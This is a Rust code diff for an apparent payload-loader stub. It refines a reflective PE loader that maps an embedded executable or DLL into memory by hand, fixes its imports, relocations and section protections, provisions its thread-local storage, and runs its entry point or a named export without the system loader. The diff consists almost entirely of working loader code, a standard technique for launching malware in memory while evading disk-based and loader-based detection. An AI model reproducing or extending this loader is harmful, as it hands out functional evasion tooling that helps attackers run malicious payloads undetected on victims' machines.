@@ -3,7 +3,7 @@
 use std::ffi::{c_void, CStr};
 use std::ptr;
 
-use windows::Win32::Foundation::{CloseHandle, GetLastError, BOOL, HINSTANCE};
+use windows::Win32::Foundation::{BOOL, HINSTANCE};
 use windows::Win32::System::Diagnostics::Debug::{
     IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DIRECTORY_ENTRY_IMPORT,
     IMAGE_DIRECTORY_ENTRY_TLS, IMAGE_FILE_DLL, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
@@ -17,9 +17,7 @@ use windows::Win32::System::SystemServices::{
     IMAGE_NT_SIGNATURE, IMAGE_REL_BASED_ABSOLUTE, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGH,
     IMAGE_REL_BASED_HIGHLOW, IMAGE_REL_BASED_LOW, IMAGE_TLS_DIRECTORY64, PIMAGE_TLS_CALLBACK,
 };
-use windows::Win32::System::Threading::{
-    CreateThread, GetCurrentProcess, GetExitCodeThread, WaitForSingleObject, THREAD_CREATION_FLAGS,
-};
+use windows::Win32::System::Threading::{GetCurrentProcess, TlsAlloc, TlsSetValue};
 
 /// Entry point signature of a mapped EXE (returns the process exit code).
 type ExeEntryPoint = unsafe extern "system" fn() -> u32;
@@ -48,12 +46,15 @@ enum ReflectiveLoadingError {
     Imports(#[from] crate::ImportError),
     #[error("could not change protection for section '{section}' (error {error})")]
     VirtualProtectFailed { section: String, error: u32 },
-    #[error("could not create execution thread (error {0})")]
-    ThreadCreationFailed(u32),
+    #[error("could not provision the payload's TLS (no index or no memory)")]
+    TlsUnavailable,
     /// `build.payload.export` names a symbol the payload does not export.
     #[error("the payload does not export '{name}'")]
     ExportNotFound { name: String },
 }
+
+/// `TlsAlloc`'s failure value.
+const TLS_OUT_OF_INDEXES: u32 = u32::MAX;
 
 /// A base relocation entry (type + offset packed in a `u16`).
 #[repr(C)]
@@ -68,35 +69,6 @@ impl BaseRelocationEntry {
 
     fn type_(&self) -> u16 {
         self.data >> 12
-    }
-}
-
-/// Context passed to the thread that runs the payload's entry point.
-#[repr(C)]
-struct EntryContext {
-    image_base: usize,
-    entry_point: usize,
-    is_dll: bool,
-}
-
-/// Thread trampoline: invokes the payload's entry point and returns its exit
-/// code. The `EntryContext` is owned by the caller and freed after the wait.
-unsafe extern "system" fn entry_trampoline(ctx: *mut c_void) -> u32 {
-    let ctx = &*(ctx as *const EntryContext);
-    // SAFETY: `entry_point` is the payload's `AddressOfEntryPoint`, which the
-    // mapping step has already copied into executable memory. Its ABI matches
-    // the signature we cast it to below.
-    if ctx.is_dll {
-        let dll_main: DllEntryPoint = std::mem::transmute(ctx.entry_point);
-        let ok = dll_main(
-            HINSTANCE(ctx.image_base as *mut c_void),
-            DLL_PROCESS_ATTACH,
-            ptr::null_mut(),
-        );
-        ok.0 as u32
-    } else {
-        let exe_main: ExeEntryPoint = std::mem::transmute(ctx.entry_point);
-        exe_main()
     }
 }
 
@@ -118,14 +90,27 @@ pub unsafe fn run_reflective(
 ) -> Result<i32, ReflectiveLoadingError> {
     let (_dos, nt) = get_headers(payload)?;
     let is_dll = (*nt).FileHeader.Characteristics.0 & IMAGE_FILE_DLL.0 != 0;
+    crate::tech_dbg!(
+        "reflective_loading",
+        "payload {} bytes (dll={is_dll})",
+        payload.len()
+    );
 
     let image_base = allocate_image(nt)?;
+    crate::tech_dbg!("reflective_loading", "image mapped at {image_base:p}");
     copy_headers(payload, image_base, nt)?;
     copy_sections(payload, image_base, nt)?;
+    crate::tech_dbg!("reflective_loading", "headers and sections copied");
     fix_imports(image_base, nt)?;
     fix_relocations(image_base, nt)?;
+    crate::tech_dbg!("reflective_loading", "relocations applied");
     fix_memory_protections(image_base, nt)?;
-    execute_tls_callbacks(image_base, nt)?;
+    crate::tech_dbg!("reflective_loading", "section protections applied");
+    // The loader would have provisioned TLS before running any payload code;
+    // `TlsSetValue` below only reaches the calling thread, so the payload runs
+    // on this one too (see `execute_entrypoint`).
+    provision_tls(image_base, nt)?;
+    crate::tech_dbg!("reflective_loading", "TLS provisioned on the current thread");
 
     if let Some(name) = export {
         // Initialize the library first: a mapped DLL's CRT/global constructors
@@ -133,12 +118,14 @@ pub unsafe fn run_reflective(
         // normally call. Skipping it leaves an export that touches the CRT
         // running against uninitialized state.
         if is_dll {
+            crate::tech_dbg!("reflective_loading", "running DllMain(DLL_PROCESS_ATTACH)");
             call_dll_main(image_base, nt);
         }
         let address = resolve_export(image_base, nt, name)
             .ok_or_else(|| ReflectiveLoadingError::ExportNotFound {
                 name: name.to_string(),
             })?;
+        crate::tech_dbg!("reflective_loading", "calling export '{name}' at 0x{address:x}");
         call_export(address);
         return Ok(0);
     }
@@ -286,10 +273,12 @@ fn fix_imports(
                 Some(rva as usize)
             })?;
 
+        let count = imports.len();
         for (iat_rva, address) in imports {
             let slot = (image_base as usize + iat_rva as usize) as *mut u64;
             *slot = address;
         }
+        crate::tech_dbg!("reflective_loading", "IAT patched ({count} import(s))");
     }
     Ok(())
 }
@@ -402,7 +391,22 @@ fn fix_memory_protections(
     Ok(())
 }
 
-fn execute_tls_callbacks(
+/// Provisions the payload's TLS the way the loader would, then runs its
+/// `DLL_PROCESS_ATTACH` callbacks.
+///
+/// A manually mapped image never gets a TLS index from the OS: the module's
+/// `_tls_index` (the DWORD `IMAGE_TLS_DIRECTORY64::AddressOfIndex` points at)
+/// stays zero and no thread's TLS slot is ever filled in. The CRT reads its
+/// per-thread state through that index, so a Rust (or otherwise CRT-using)
+/// payload fast-fails with `STATUS_STACK_BUFFER_OVERRUN` on its first
+/// thread-local access. This allocates a real index, materializes the `.tls`
+/// template in a private block and points the calling thread's slot at it.
+///
+/// Limitation: TLS slots are per thread. Threads the payload creates itself get
+/// a zeroed slot for this index, so a payload that spawns threads and touches
+/// thread-local state on them needs a TLS-aware thread trampoline (out of
+/// scope).
+fn provision_tls(
     image_base: *mut c_void,
     nt: *const IMAGE_NT_HEADERS64,
 ) -> Result<(), ReflectiveLoadingError> {
@@ -415,6 +419,44 @@ fn execute_tls_callbacks(
         let tls =
             (image_base as usize + tls_dir.VirtualAddress as usize) as *const IMAGE_TLS_DIRECTORY64;
         let callbacks = (*tls).AddressOfCallBacks as *const PIMAGE_TLS_CALLBACK;
+        let index_field = (*tls).AddressOfIndex as *mut u32;
+        let raw_start = (*tls).StartAddressOfRawData as usize;
+        let raw_len = ((*tls).EndAddressOfRawData as usize).saturating_sub(raw_start);
+        let zero_fill = (*tls).SizeOfZeroFill as usize;
+
+        if !index_field.is_null() && raw_len + zero_fill > 0 {
+            let index = TlsAlloc();
+            if index == TLS_OUT_OF_INDEXES {
+                return Err(ReflectiveLoadingError::TlsUnavailable);
+            }
+            // What the payload's CRT reads as `_tls_index`.
+            *index_field = index;
+
+            // Enough for the template plus the zero-filled tail; the loader
+            // gives every thread its own copy, so thread-locals start at their
+            // image-initialized values.
+            let mut block = ptr::null_mut();
+            let mut size = raw_len + zero_fill;
+            let status = crate::nt_alloc_vm(
+                GetCurrentProcess(),
+                &mut block,
+                0,
+                &mut size,
+                MEM_COMMIT.0 | MEM_RESERVE.0,
+                PAGE_READWRITE.0,
+            );
+            if status < 0 || block.is_null() {
+                return Err(ReflectiveLoadingError::TlsUnavailable);
+            }
+            if raw_len > 0 {
+                ptr::copy_nonoverlapping(raw_start as *const u8, block as *mut u8, raw_len);
+            }
+            // The TLS slot holds a pointer to the per-thread block, which is
+            // exactly what `TlsSetValue` writes into the calling thread's slot.
+            TlsSetValue(index, Some(block as *const c_void))
+                .map_err(|_| ReflectiveLoadingError::TlsUnavailable)?;
+        }
+
         if !callbacks.is_null() {
             let mut i = 0usize;
             while let Some(callback) = *callbacks.add(i) {
@@ -426,44 +468,34 @@ fn execute_tls_callbacks(
     Ok(())
 }
 
-/// Runs the payload's entry point in a separate thread and returns its exit
-/// code.
+/// Runs the payload's entry point on this thread and returns its exit code.
+///
+/// The payload keeps the stub's thread (rather than getting a fresh one): the
+/// TLS slot provisioned above belongs to the calling thread, and the payload's
+/// CRT reads it from there. A payload that calls `ExitProcess` ends the process,
+/// exactly as it would from a thread it created itself.
 fn execute_entrypoint(
     image_base: *mut c_void,
     nt: *const IMAGE_NT_HEADERS64,
     is_dll: bool,
 ) -> Result<i32, ReflectiveLoadingError> {
-    unsafe {
-        let entry_point = image_base as usize + (*nt).OptionalHeader.AddressOfEntryPoint as usize;
-        let ctx = Box::into_raw(Box::new(EntryContext {
-            image_base: image_base as usize,
-            entry_point,
-            is_dll,
-        }));
-
-        let thread = CreateThread(
-            None,
-            0,
-            Some(entry_trampoline),
-            Some(ctx as *const c_void),
-            THREAD_CREATION_FLAGS(0),
-            None,
-        )
-        .map_err(|_| {
-            drop(Box::from_raw(ctx));
-            ReflectiveLoadingError::ThreadCreationFailed(GetLastError().0)
-        })?;
-
-        WaitForSingleObject(thread, u32::MAX);
-        let mut exit_code = 0u32;
-        let _ = GetExitCodeThread(thread, &mut exit_code);
-        let _ = CloseHandle(thread);
-        // The thread has finished, so the trampoline no longer reads the
-        // context; safe to free it here.
-        drop(Box::from_raw(ctx));
-
-        Ok(exit_code as i32)
+    if is_dll {
+        crate::tech_dbg!("reflective_loading", "running DllMain(DLL_PROCESS_ATTACH)");
+        call_dll_main(image_base, nt);
+        return Ok(0);
     }
+
+    let entry_point = image_base as usize + unsafe { (*nt).OptionalHeader.AddressOfEntryPoint } as usize;
+    crate::tech_dbg!(
+        "reflective_loading",
+        "jumping to entry point 0x{entry_point:x}"
+    );
+    // SAFETY: `entry_point` is the payload's `AddressOfEntryPoint`, copied into
+    // executable memory with a matching ABI by the mapping steps above.
+    let exe_main: ExeEntryPoint = unsafe { std::mem::transmute(entry_point) };
+    let code = unsafe { exe_main() } as i32;
+    crate::tech_dbg!("reflective_loading", "payload returned {code}");
+    Ok(code)
 }
 
 /// The export directory, as laid out in the mapped image. Defined by hand so
